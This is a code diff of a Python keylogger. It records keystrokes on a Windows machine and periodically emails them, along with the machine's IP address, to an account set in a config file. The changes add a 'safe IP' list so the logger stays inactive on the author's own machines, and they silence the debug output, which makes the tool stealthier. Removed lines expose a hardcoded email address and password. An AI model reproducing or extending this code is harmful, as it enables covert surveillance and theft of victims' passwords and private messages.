@@ -9,12 +9,19 @@ import time
 import urllib2
 import json
 from multiprocessing import Process, Pipe
+import os
 
-file_log = r'C:\keylogging\keylog.txt'
-f = open(file_log, 'r+')
+curr_dir = os.path.dirname(os.path.realpath(__file__))
+file_log = curr_dir+r'\keylog.txt'
+file_safe_ips = curr_dir+r'\safeips.txt'
+file_config = curr_dir+r'\config.txt'
+f_conf = open(file_config, 'a+')
+f_ips = open(file_safe_ips, 'a+')
+f = open(file_log, 'a+')
 f.seek(0)
 f.truncate()
 last_sent = datetime.datetime.now()
+system_is_safe = False
 
 #proc 1
 def on_keyboard_event(event):
@@ -30,16 +37,18 @@ def get_permission_to_send():
 
     buffer_size = f.tell()
 
-    print('f.tell():', buffer_size)
-    print('DELTA:', delta.seconds)
+    # print('f.tell():', buffer_size)
+    # print('DELTA:', delta.seconds)
     if delta.seconds > 300 or buffer_size > 400:
         return True
 
 #proc 2
 def send_email(body):
-    username = "n1gh7dev@gmail.com"
-    password = "testdev123"
-    message = Message("n1gh7dev@gmail.com", "n1gh7dev@gmail.com", "logging", body)
+    args = f_conf.read().split(',')
+    username = args[0]
+    send_to = args[1]
+    password = args[2]
+    message = Message(send_to, username, args[3], body)
     sender = EmailService()
     sender.send(message, username, password)
 
@@ -56,31 +65,37 @@ def init_logging(pipe):
 
 if internet_on():
     try:
-        send_email(get_own_ip())
+        curr_ip = get_own_ip()
+        safe_ips = f_ips.read().split(',')
+        if curr_ip not in safe_ips:
+            system_is_safe = False
+            send_email(get_own_ip())
+        else:
+            system_is_safe = True
     except:
         pass
 
+if not system_is_safe:
+    if __name__ == '__main__':
+        sender_proc, receiver_proc = Pipe()
+        p = Process(target=init_logging, args=(sender_proc, ))
+        p.start()
 
-if __name__ == '__main__':
-    sender_proc, receiver_proc = Pipe()
-    p = Process(target=init_logging, args=(sender_proc, ))
-    p.start()
+        while True:
+            time.sleep(0.2)
+            if receiver_proc.poll():
+                character = receiver_proc.recv()
+                f.write(character)
+                #print('received char:', character)
 
-    while True:
-        time.sleep(0.2)
-        if receiver_proc.poll():
-            character = receiver_proc.recv()
-            f.write(character)
-            print('received char:', character)
-
-        if get_permission_to_send() and internet_on():
-            ip = get_own_ip()
-            f.seek(0)
-            keystrokes = f.read()
-            send_email(ip + '\n' + keystrokes)
-            last_sent = datetime.datetime.now()
-            f.seek(0)
-            f.truncate()
+            if get_permission_to_send() and internet_on():
+                ip = get_own_ip()
+                f.seek(0)
+                keystrokes = f.read()
+                send_email(ip + '\n' + keystrokes)
+                last_sent = datetime.datetime.now()
+                f.seek(0)
+                f.truncate()
 
 
 
